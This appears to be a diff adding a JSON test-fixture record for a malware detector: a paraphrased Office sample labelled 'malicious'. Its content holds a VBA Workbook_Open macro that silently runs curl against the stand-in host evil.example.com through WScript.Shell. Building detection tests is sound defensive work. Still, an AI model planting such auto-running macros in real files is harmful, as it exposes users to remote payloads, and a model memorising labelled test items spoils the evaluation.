@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::document-office::62::paraphrase-variations::3",
+  "base_sample_id": "exp::document-office::62",
+  "generator_id": "paraphrase-variations",
+  "generator_version": "1.0.0",
+  "seed": -1535930521,
+  "content": "Private Sub Workbook_Open()\n  CreateObject(\"WScript.Shell\").Run \"curl (following best practices) http://evil.example.com/\"\nEnd Sub\n",
+  "content_hash": "5fa11294c264aaf89e082d5d6335b2f4d14a70abae6ea1f2e191e6f303935e95",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "paraphrase:jargon",
+  "difficulty": "moderate"
+}
